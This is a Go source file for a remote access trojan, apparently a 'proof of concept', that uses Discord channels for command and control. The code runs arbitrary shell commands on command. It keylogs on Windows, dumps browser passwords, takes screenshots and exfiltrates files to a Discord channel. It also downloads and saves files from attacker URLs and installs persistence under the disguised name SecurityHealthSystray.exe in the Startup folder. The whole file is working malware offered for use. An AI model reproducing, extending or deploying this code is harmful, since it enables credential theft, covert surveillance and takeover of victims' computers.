package main

import (
	"bytes"
	"fmt"
	"image/png"
	"io"
	"log"
	"net/http"
	"os"
	"os/signal"
	"path/filepath"
	"runtime"
	"strings"
	"syscall"
	"time"
	"unsafe"

	"discord-c2-poc/pkg/utils"

	"github.com/bwmarrin/discordgo"
	"github.com/joho/godotenv"
	"github.com/kbinani/screenshot"
)

// Configuration variables
// These can be set at compile time using -ldflags
var (
	Token          string
	CommandChannel string
	ResultChannel  string
	KeyString      string // Used for ldflags injection
	EncryptionKey  []byte // Derived from KeyString
)

func init() {
	// If variables are not set via ldflags (empty), try loading from .env
	if Token == "" || CommandChannel == "" || ResultChannel == "" || KeyString == "" {
		// Load .env file if it exists (silently ignore error if missing)
		_ = godotenv.Load()

		if Token == "" {
			Token = os.Getenv("DISCORD_TOKEN")
		}
		if CommandChannel == "" {
			CommandChannel = os.Getenv("COMMAND_CHANNEL_ID")
		}
		if ResultChannel == "" {
			ResultChannel = os.Getenv("RESULT_CHANNEL_ID")
		}
		if KeyString == "" {
			KeyString = os.Getenv("ENCRYPTION_KEY")
		}
	}

	if Token == "" || CommandChannel == "" || ResultChannel == "" || KeyString == "" {
		log.Fatal("Missing required configuration. Either build with -ldflags or provide .env")
	}

	// Key must be 32 bytes for AES-256
	if len(KeyString) != 32 {
		log.Fatal("ENCRYPTION_KEY must be exactly 32 characters long")
	}
	EncryptionKey = []byte(KeyString)
}

func main() {
	// Prevent multiple instances using a Named Mutex (Windows only)
	if runtime.GOOS == "windows" {
		_, err := createMutex("Global\\DiscordC2AgentMutex")
		if err != nil {
			// Agent is already running, exit silently
			return
		}
	}

	// Create a new Discord session using the provided bot token.
	dg, err := discordgo.New("Bot " + Token)
	if err != nil {
		log.Fatalf("error creating Discord session: %v", err)
	}

	// Register the messageCreate func as a callback for MessageCreate events.
	dg.AddHandler(messageCreate)

	// In this example, we only care about receiving message events.
	dg.Identify.Intents = discordgo.IntentsGuildMessages

	// Open a websocket connection to Discord and begin listening.
	err = dg.Open()
	if err != nil {
		log.Fatalf("error opening connection: %v", err)
	}

	log.Println("Agent is running. Press CTRL-C to exit.")

	// Send initial check-in message
	hostname, _ := os.Hostname()
	checkInMsg := fmt.Sprintf("[%s] Agent Online (%s)", hostname, runtime.GOOS)
	sendEncryptedChunk(dg, ResultChannel, []byte(checkInMsg), EncryptionKey)

	// Start Keylogger
	if runtime.GOOS == "windows" {
		go startKeylogger()
	}

	// Start Heartbeat Loop (every 30 seconds)
	go func() {
		ticker := time.NewTicker(30 * time.Second)
		defer ticker.Stop()
		for range ticker.C {
			// Send heartbeat
			// Format: [HOSTNAME] HEARTBEAT
			heartbeatMsg := fmt.Sprintf("[%s] HEARTBEAT", hostname)
			sendEncryptedChunk(dg, ResultChannel, []byte(heartbeatMsg), EncryptionKey)
		}
	}()

	// Wait here until CTRL-C or other term signal is received.
	sc := make(chan os.Signal, 1)
	signal.Notify(sc, syscall.SIGINT, syscall.SIGTERM, os.Interrupt)
	<-sc

	// Cleanly close down the Discord session.
	dg.Close()
}

// messageCreate is called every time a new message is created on any channel that the authenticated bot has access to.
func messageCreate(s *discordgo.Session, m *discordgo.MessageCreate) {
	// NOTE: We removed the check that ignores the bot's own messages.
	// Since we are likely using the SAME Bot Token for both Agent and Server,
	// we need to process messages sent by "ourselves" (the Controller).
	// We rely on Channel separation (Command vs Result) to avoid loops.
	/*
		if m.Author.ID == s.State.User.ID {
			return
		}
	*/

	// Only listen to the specific command channel
	if m.ChannelID != CommandChannel {
		return
	}

	// Check if the message starts with our prefix
	if strings.HasPrefix(m.Content, "!exec ") {
		rawCommand := strings.TrimPrefix(m.Content, "!exec ")

		// Check for targeting: !exec [HOSTNAME] command OR !exec ALL command
		// If no target specified (old format), assume ALL for backward compatibility or ignore.
		// Let's assume the server ALWAYS sends a target now.

		myHostname, _ := os.Hostname()
		target := "ALL"
		command := rawCommand

		if strings.HasPrefix(rawCommand, "[") && strings.Contains(rawCommand, "] ") {
			end := strings.Index(rawCommand, "] ")
			target = rawCommand[1:end]
			command = rawCommand[end+2:]
		}

		// Filter: Am I the target?
		if target != "ALL" && target != myHostname {
			// Ignore command meant for someone else
			return
		}

		log.Printf("[*] Executing command: %s", command)

		var output []byte
		var err error

		// Handle "cd" command specially to maintain state
		if strings.HasPrefix(command, "cd ") {
			newDir := strings.TrimSpace(strings.TrimPrefix(command, "cd "))
			err = os.Chdir(newDir)
			if err != nil {
				output = []byte(fmt.Sprintf("Error changing directory: %v", err))
			} else {
				wd, _ := os.Getwd()
				output = []byte(fmt.Sprintf("Changed directory to: %s", wd))
			}
		} else {
			// Execute the command
			output, err = executeCommand(command)
			if err != nil {
				output = []byte(fmt.Sprintf("Error executing command: %v", err))
			}
		}

		// Prepend Hostname to output
		hostname, _ := os.Hostname()
		output = append([]byte(fmt.Sprintf("[%s]\n", hostname)), output...)

		// Split the output into chunks if it's too large
		// Discord limit is 2000 chars. Base64 overhead is ~33%.
		// So we need to keep the plaintext under ~1400 bytes per message to be safe.
		const maxChunkSize = 1400

		if len(output) <= maxChunkSize {
			sendEncryptedChunk(s, ResultChannel, output, EncryptionKey)
		} else {
			for i := 0; i < len(output); i += maxChunkSize {
				end := i + maxChunkSize
				if end > len(output) {
					end = len(output)
				}

				chunk := output[i:end]
				sendEncryptedChunk(s, ResultChannel, chunk, EncryptionKey)
			}
		}
	} else if strings.HasPrefix(m.Content, "!keys") {
		rawCommand := strings.TrimPrefix(m.Content, "!keys")
		myHostname, _ := os.Hostname()
		target := "ALL"

		if strings.HasPrefix(rawCommand, " [") && strings.Contains(rawCommand, "]") {
			end := strings.Index(rawCommand, "]")
			target = rawCommand[2:end]
		}

		if target != "ALL" && target != myHostname {
			return
		}

		logs := getKeylogs()
		if logs == "" {
			sendEncryptedChunk(s, ResultChannel, []byte(fmt.Sprintf("[%s] No keystrokes recorded.", myHostname)), EncryptionKey)
		} else {
			sendEncryptedChunk(s, ResultChannel, []byte(fmt.Sprintf("[%s] Keystrokes:\n%s", myHostname, logs)), EncryptionKey)
		}

	} else if strings.HasPrefix(m.Content, "!persist") {
		rawCommand := strings.TrimPrefix(m.Content, "!persist")

		// Check targeting
		myHostname, _ := os.Hostname()
		target := "ALL"

		if strings.HasPrefix(rawCommand, " [") && strings.Contains(rawCommand, "]") {
			end := strings.Index(rawCommand, "]")
			target = rawCommand[2:end]
		}

		if target != "ALL" && target != myHostname {
			return
		}

		log.Println("[*] Installing persistence...")
		msg, err := installPersistence()
		if err != nil {
			msg = fmt.Sprintf("Persistence failed: %v", err)
		}

		output := []byte(fmt.Sprintf("[%s] %s", myHostname, msg))
		sendEncryptedChunk(s, ResultChannel, output, EncryptionKey)

	} else if strings.HasPrefix(m.Content, "!download") {
		// Format: !download [TARGET] filepath
		rawCommand := strings.TrimPrefix(m.Content, "!download")
		myHostname, _ := os.Hostname()
		target := "ALL"
		path := strings.TrimSpace(rawCommand)

		if strings.HasPrefix(rawCommand, " [") && strings.Contains(rawCommand, "] ") {
			end := strings.Index(rawCommand, "] ")
			target = rawCommand[2:end]
			path = strings.TrimSpace(rawCommand[end+2:])
		}

		if target != "ALL" && target != myHostname {
			return
		}

		log.Printf("[*] Uploading file to Discord: %s", path)

		file, err := os.Open(path)
		if err != nil {
			sendEncryptedChunk(s, ResultChannel, []byte(fmt.Sprintf("[%s] Error opening file: %v", myHostname, err)), EncryptionKey)
			return
		}
		defer file.Close()

		// Prefix filename with hostname for identification
		originalName := filepath.Base(path)
		prefixedName := fmt.Sprintf("%s_%s", myHostname, originalName)

		_, err = s.ChannelFileSend(ResultChannel, prefixedName, file)
		if err != nil {
			sendEncryptedChunk(s, ResultChannel, []byte(fmt.Sprintf("[%s] Error sending file: %v", myHostname, err)), EncryptionKey)
		}

	} else if strings.HasPrefix(m.Content, "!upload") {
		// Format: !upload [TARGET] (with attachment)
		// OR: !upload [TARGET] http://url/file.exe
		rawCommand := strings.TrimPrefix(m.Content, "!upload")
		myHostname, _ := os.Hostname()
		target := "ALL"
		url := ""

		if strings.HasPrefix(rawCommand, " [") && strings.Contains(rawCommand, "]") {
			end := strings.Index(rawCommand, "]")
			target = rawCommand[2:end]
			if len(rawCommand) > end+1 {
				url = strings.TrimSpace(rawCommand[end+1:])
			}
		} else {
			url = strings.TrimSpace(rawCommand)
		}

		if target != "ALL" && target != myHostname {
			return
		}

		// Case 1: Download from URL
		if url != "" && (strings.HasPrefix(url, "http://") || strings.HasPrefix(url, "https://")) {
			log.Printf("[*] Downloading from URL: %s", url)
			resp, err := http.Get(url)
			if err != nil {
				sendEncryptedChunk(s, ResultChannel, []byte(fmt.Sprintf("[%s] Error downloading: %v", myHostname, err)), EncryptionKey)
				return
			}
			defer resp.Body.Close()

			filename := filepath.Base(url)
			out, err := os.Create(filename)
			if err != nil {
				sendEncryptedChunk(s, ResultChannel, []byte(fmt.Sprintf("[%s] Error creating file: %v", myHostname, err)), EncryptionKey)
				return
			}
			defer out.Close()

			_, err = io.Copy(out, resp.Body)
			if err != nil {
				sendEncryptedChunk(s, ResultChannel, []byte(fmt.Sprintf("[%s] Error saving file: %v", myHostname, err)), EncryptionKey)
				return
			}
			sendEncryptedChunk(s, ResultChannel, []byte(fmt.Sprintf("[%s] File downloaded: %s", myHostname, filename)), EncryptionKey)
			return
		}

		// Case 2: Download from Discord Attachment
		if len(m.Attachments) > 0 {
			for _, att := range m.Attachments {
				log.Printf("[*] Downloading attachment: %s", att.Filename)
				resp, err := http.Get(att.URL)
				if err != nil {
					sendEncryptedChunk(s, ResultChannel, []byte(fmt.Sprintf("[%s] Error downloading attachment: %v", myHostname, err)), EncryptionKey)
					continue
				}
				defer resp.Body.Close()

				out, err := os.Create(att.Filename)
				if err != nil {
					sendEncryptedChunk(s, ResultChannel, []byte(fmt.Sprintf("[%s] Error creating file: %v", myHostname, err)), EncryptionKey)
					continue
				}
				defer out.Close()

				_, err = io.Copy(out, resp.Body)
				if err != nil {
					sendEncryptedChunk(s, ResultChannel, []byte(fmt.Sprintf("[%s] Error saving file: %v", myHostname, err)), EncryptionKey)
					continue
				}
				sendEncryptedChunk(s, ResultChannel, []byte(fmt.Sprintf("[%s] Attachment saved: %s", myHostname, att.Filename)), EncryptionKey)
			}
		}
	} else if strings.HasPrefix(m.Content, "!dumppass") {
		rawCommand := strings.TrimPrefix(m.Content, "!dumppass")
		myHostname, _ := os.Hostname()
		target := "ALL"

		if strings.HasPrefix(rawCommand, " [") && strings.Contains(rawCommand, "]") {
			end := strings.Index(rawCommand, "]")
			target = rawCommand[2:end]
		}

		if target != "ALL" && target != myHostname {
			return
		}

		log.Println("[*] Dumping passwords...")
		passwords := DumpBrowsers()

		// Send as file because it might be large
		if len(passwords) > 0 {
			reader := strings.NewReader(passwords)
			fileName := fmt.Sprintf("passwords_%s.txt", myHostname)
			_, err := s.ChannelFileSend(ResultChannel, fileName, reader)
			if err != nil {
				sendEncryptedChunk(s, ResultChannel, []byte(fmt.Sprintf("[%s] Error sending passwords: %v", myHostname, err)), EncryptionKey)
			}
		} else {
			sendEncryptedChunk(s, ResultChannel, []byte(fmt.Sprintf("[%s] No passwords found.", myHostname)), EncryptionKey)
		}

	} else if strings.HasPrefix(m.Content, "!screenshot") {
		rawCommand := strings.TrimPrefix(m.Content, "!screenshot")

		// Check targeting for screenshot too
		myHostname, _ := os.Hostname()
		target := "ALL"

		if strings.HasPrefix(rawCommand, " [") && strings.Contains(rawCommand, "]") {
			// Format: !screenshot [HOSTNAME]
			end := strings.Index(rawCommand, "]")
			target = rawCommand[2:end] // Skip " ["
		}

		if target != "ALL" && target != myHostname {
			return
		}

		log.Println("[*] Taking screenshot...")

		// Take screenshot
		n := screenshot.NumActiveDisplays()
		if n <= 0 {
			return
		}

		// Capture primary display (0)
		bounds := screenshot.GetDisplayBounds(0)
		img, err := screenshot.CaptureRect(bounds)
		if err != nil {
			log.Printf("Error capturing screen: %v", err)
			return
		}

		// Encode to PNG
		var buf bytes.Buffer
		err = png.Encode(&buf, img)
		if err != nil {
			log.Printf("Error encoding PNG: %v", err)
			return
		}

		// Send as file attachment
		// Note: We are NOT encrypting the image here for simplicity,
		// but in a real scenario you would encrypt the bytes before sending.
		// Discord uses HTTPS so the transfer is encrypted in transit.
		hostname, _ := os.Hostname()
		fileName := fmt.Sprintf("screenshot_%s.png", hostname)

		_, err = s.ChannelFileSend(ResultChannel, fileName, &buf)
		if err != nil {
			log.Printf("Error sending screenshot: %v", err)
		}
	}
}

func sendEncryptedChunk(s *discordgo.Session, channelID string, data []byte, key []byte) {
	encryptedOutput, err := utils.Encrypt(data, key)
	if err != nil {
		log.Printf("Error encrypting chunk: %v", err)
		return
	}

	_, err = s.ChannelMessageSend(channelID, encryptedOutput)
	if err != nil {
		log.Printf("Error sending chunk: %v", err)
	}
}

// executeCommand is now defined in exec_windows.go and exec_unix.go using build tags

func installPersistence() (string, error) {
	exe, err := os.Executable()
	if err != nil {
		return "", err
	}

	// Method 2: Startup Folder (Less flagged than Registry)
	// %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup
	destDir := os.Getenv("APPDATA") + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
	destPath := destDir + "\\SecurityHealthSystray.exe"

	// Copy file
	input, err := os.ReadFile(exe)
	if err != nil {
		return "", err
	}
	err = os.WriteFile(destPath, input, 0755)
	if err != nil {
		return "", err
	}

	return "Persistence installed to Startup: " + destPath, nil
}

// Windows Mutex implementation
var (
	kernel32        = syscall.NewLazyDLL("kernel32.dll")
	procCreateMutex = kernel32.NewProc("CreateMutexW")
)

func createMutex(name string) (uintptr, error) {
	namePtr, _ := syscall.UTF16PtrFromString(name)
	ret, _, err := procCreateMutex.Call(
		0,
		0,
		uintptr(unsafe.Pointer(namePtr)),
	)
	if ret == 0 {
		return 0, err
	}
	if err == syscall.Errno(183) { // ERROR_ALREADY_EXISTS
		return 0, fmt.Errorf("already exists")
	}
	return ret, nil
}
